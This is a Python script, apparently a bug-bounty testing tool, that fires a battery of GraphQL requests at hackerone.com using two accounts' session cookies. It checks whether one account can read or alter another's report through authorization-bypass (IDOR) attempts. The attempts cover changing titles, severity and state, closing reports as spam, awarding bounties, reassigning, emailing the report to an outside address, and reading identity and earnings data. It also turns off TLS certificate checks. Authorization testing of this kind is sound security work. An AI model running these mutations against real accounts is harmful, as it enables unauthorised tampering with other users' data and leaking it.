#!/usr/bin/env python3
"""
HackerOne Mutation IDOR Battery
Tests whether Account B can execute privileged mutations on Account A's report.

Usage:
  python3 h1_mutation_idor.py \
    --cookie-a "__Host-session=XXXX" \
    --cookie-b "__Host-session=YYYY; app_signed_in=true" \
    --report-id 3589717 \
    --report-gid "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTg5NzE3"
"""

import argparse
import json
import ssl
import urllib.request
import urllib.error
import urllib.parse
import re
import time

BASE = "https://hackerone.com"

def make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def get_csrf(cookie: str) -> str:
    req = urllib.request.Request(
        BASE,
        headers={
            "Cookie": cookie,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Accept": "text/html",
        },
    )
    with urllib.request.urlopen(req, context=make_ctx(), timeout=15) as r:
        html = r.read().decode(errors="replace")
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', html)
    return m.group(1) if m else ""

def gql(cookie: str, csrf: str, query: str, variables: dict = None) -> tuple[int, dict]:
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"{BASE}/graphql",
        data=data,
        headers={
            "Cookie": cookie,
            "X-CSRF-Token": csrf,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, context=make_ctx(), timeout=15) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {"_raw": e.read().decode(errors="replace")}
    except Exception as e:
        return 0, {"_error": str(e)}

def check(label: str, status: int, resp: dict) -> bool:
    """Print result. Return True if potential finding."""
    errors = resp.get("errors", [])
    data = resp.get("data", {})

    err_msgs = [e.get("message", "") for e in errors]
    has_data = any(v is not None for v in data.values()) if data else False

    # Signs of success (FINDING territory)
    finding = False
    if has_data and not errors:
        finding = True
    if has_data and errors and not any("not authorized" in m.lower() or "permission" in m.lower() or "not found" in m.lower() for m in err_msgs):
        finding = True

    marker = "[!!FINDING!!]" if finding else "[BLOCKED]   "
    print(f"\n  {marker} {label}")
    print(f"  HTTP {status} | errors={err_msgs[:2] if err_msgs else 'none'}")
    if has_data:
        print(f"  data={json.dumps(data)[:200]}")
    return finding

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cookie-a", required=True, help="Account A full cookie string")
    parser.add_argument("--cookie-b", required=True, help="Account B full cookie string")
    parser.add_argument("--report-id", required=True, help="Numeric report ID (Account A's)")
    parser.add_argument("--report-gid", required=True, help="Base64 GID of the report")
    args = parser.parse_args()

    print("=" * 60)
    print("HackerOne Mutation IDOR Battery")
    print("=" * 60)

    # Get CSRF tokens
    print("\n[*] Getting CSRF tokens...")
    csrf_a = get_csrf(args.cookie_a)
    csrf_b = get_csrf(args.cookie_b)
    print(f"  A CSRF: {csrf_a[:20]}..." if csrf_a else "  A CSRF: FAILED")
    print(f"  B CSRF: {csrf_b[:20]}..." if csrf_b else "  B CSRF: FAILED")

    if not csrf_b:
        print("ERROR: Could not get CSRF for Account B. Check cookie.")
        return

    # Verify Account B identity
    print("\n[*] Verifying Account B session...")
    status, resp = gql(args.cookie_b, csrf_b, "{ me { username databaseId } }")
    me = resp.get("data", {}).get("me", {})
    print(f"  Logged in as: {me.get('username')} (ID {me.get('databaseId')})")

    rid = args.report_id
    gid = args.report_gid
    findings = []

    print("\n" + "=" * 60)
    print("PHASE 1: Read-only access as Account B")
    print("=" * 60)

    # Try to read the report directly
    q = f'{{ report(id: {rid}) {{ id title state vulnerability_information }} }}'
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check(f"Read report {rid} as B", status, resp):
        findings.append("Read report")
    time.sleep(0.5)

    # Try node GID access
    q = f'{{ node(id: "{gid}") {{ ... on Report {{ id title state }} }} }}'
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check(f"node(GID) read as B", status, resp):
        findings.append("node GID read")
    time.sleep(0.5)

    # Try accessing report via search
    q = f'''{{
      reports(where: {{ id: {{ eq: {rid} }} }}) {{
        nodes {{ id title state vulnerability_information }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check(f"reports(where: id={rid}) as B", status, resp):
        findings.append("reports search")
    time.sleep(0.5)

    print("\n" + "=" * 60)
    print("PHASE 2: State-changing mutations as Account B")
    print("=" * 60)

    # updateReportTitle
    q = f'''mutation {{
      updateReportTitle(input: {{
        id: "{gid}"
        title: "TEST_IDOR_TITLE_DO_NOT_SUBMIT"
      }}) {{
        report {{ id title }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("updateReportTitle as B", status, resp):
        findings.append("updateReportTitle")
    time.sleep(0.5)

    # updateReportVulnerabilityInformation
    q = f'''mutation {{
      updateReportVulnerabilityInformation(input: {{
        id: "{gid}"
        vulnerability_information: "IDOR_TEST"
      }}) {{
        report {{ id vulnerability_information }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("updateReportVulnerabilityInformation as B", status, resp):
        findings.append("updateReportVulnerabilityInformation")
    time.sleep(0.5)

    # addReportComment
    q = f'''mutation {{
      addReportComment(input: {{
        report_id: "{gid}"
        message: "IDOR_TEST_COMMENT_DO_NOT_ACCEPT"
        internal: false
      }}) {{
        activity {{ ... on ActivityComment {{ message }} }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("addReportComment as B", status, resp):
        findings.append("addReportComment")
    time.sleep(0.5)

    # updateReportSeverity
    q = f'''mutation {{
      updateReportSeverity(input: {{
        report_id: "{gid}"
        rating: "critical"
      }}) {{
        report {{ id severity {{ rating }} }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("updateReportSeverity as B", status, resp):
        findings.append("updateReportSeverity")
    time.sleep(0.5)

    # updateReportStateToTriaged
    q = f'''mutation {{
      updateReportStateToTriaged(input: {{
        id: "{gid}"
      }}) {{
        report {{ id state }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("updateReportStateToTriaged as B", status, resp):
        findings.append("updateReportStateToTriaged")
    time.sleep(0.5)

    # closeReport
    q = f'''mutation {{
      closeReport(input: {{
        id: "{gid}"
        reason: "spam"
      }}) {{
        report {{ id state }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("closeReport as B", status, resp):
        findings.append("closeReport")
    time.sleep(0.5)

    # requestPublicDisclosure
    q = f'''mutation {{
      requestPublicDisclosure(input: {{
        id: "{gid}"
      }}) {{
        report {{ id }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("requestPublicDisclosure as B", status, resp):
        findings.append("requestPublicDisclosure")
    time.sleep(0.5)

    print("\n" + "=" * 60)
    print("PHASE 3: Attachment / file access as Account B")
    print("=" * 60)

    # Get A's report attachments via A, then try to access as B
    print("\n  [*] Fetching A's report attachments via A...")
    q = f'{{ report(id: {rid}) {{ attachments {{ id url expiring_url }} }} }}'
    status, resp = gql(args.cookie_a, csrf_a, q)
    attachments = resp.get("data", {}).get("report", {}).get("attachments", [])
    print(f"  Found {len(attachments)} attachments")

    for att in attachments[:3]:
        att_id = att.get("id")
        att_url = att.get("url") or att.get("expiring_url")
        if att_id:
            # Try accessing attachment metadata as B
            q2 = f'{{ node(id: "{att_id}") {{ ... on Attachment {{ id url expiring_url }} }} }}'
            status2, resp2 = gql(args.cookie_b, csrf_b, q2)
            if check(f"Attachment {att_id} as B", status2, resp2):
                findings.append(f"attachment-{att_id}")
        time.sleep(0.3)

    print("\n" + "=" * 60)
    print("PHASE 4: User-level sensitive data as B")
    print("=" * 60)

    # Try to read A's identity verification / legal documents
    user_a_id = "2617918"
    q = f'{{ user(id: "{user_a_id}") {{ id username profile_picture(size: large) reputation signal agreed_to_coc }} }}'
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("user(id) public profile as B", status, resp):
        findings.append("user public profile")
    time.sleep(0.5)

    # Try to read identity verification status
    q = f'{{ user(id: "{user_a_id}") {{ identity_verification_status}} }}'
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("identity_verification_status as B", status, resp):
        findings.append("identity_verification_status")
    time.sleep(0.5)

    # Try earnings data
    q = '{ me { total_paid_amount total_received_amount } }'
    status_a, resp_a = gql(args.cookie_a, csrf_a, q)
    # Now try to get via node for A's user GID
    import base64
    a_gid = base64.b64encode(f"gid://hackerone/User/{user_a_id}".encode()).decode()
    q2 = f'{{ node(id: "{a_gid}") {{ ... on User {{ username total_paid_amount total_received_amount }} }} }}'
    status, resp = gql(args.cookie_b, csrf_b, q2)
    if check("User earnings via node(GID) as B", status, resp):
        findings.append("user earnings via GID")
    time.sleep(0.5)

    print("\n" + "=" * 60)
    print("PHASE 5: Program manager mutations as B")
    print("=" * 60)

    # awardBounty on A's report
    q = f'''mutation {{
      awardBounty(input: {{
        report_id: "{gid}"
        amount: 1
        currency: "USD"
        message: "IDOR_TEST"
      }}) {{
        bounty {{ amount }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("awardBounty as B on A's report", status, resp):
        findings.append("awardBounty")
    time.sleep(0.5)

    # assignReport
    q = f'''mutation {{
      assignReport(input: {{
        report_id: "{gid}"
        assignee_id: "4378355"
      }}) {{
        report {{ id assignee {{ username }} }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("assignReport as B", status, resp):
        findings.append("assignReport")
    time.sleep(0.5)

    # shareReportViaEmail
    q = f'''mutation {{
      shareReportViaEmail(input: {{
        id: "{gid}"
        email: "awarexone@example.com"
        message: "IDOR_TEST"
      }}) {{
        report {{ id }}
      }}
    }}'''
    status, resp = gql(args.cookie_b, csrf_b, q)
    if check("shareReportViaEmail as B", status, resp):
        findings.append("shareReportViaEmail")
    time.sleep(0.5)

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    if findings:
        print(f"\n  [!!] POTENTIAL FINDINGS ({len(findings)}):")
        for f in findings:
            print(f"    - {f}")
    else:
        print("\n  [OK] No IDOR findings — all mutations properly blocked for Account B")

if __name__ == "__main__":
    main()
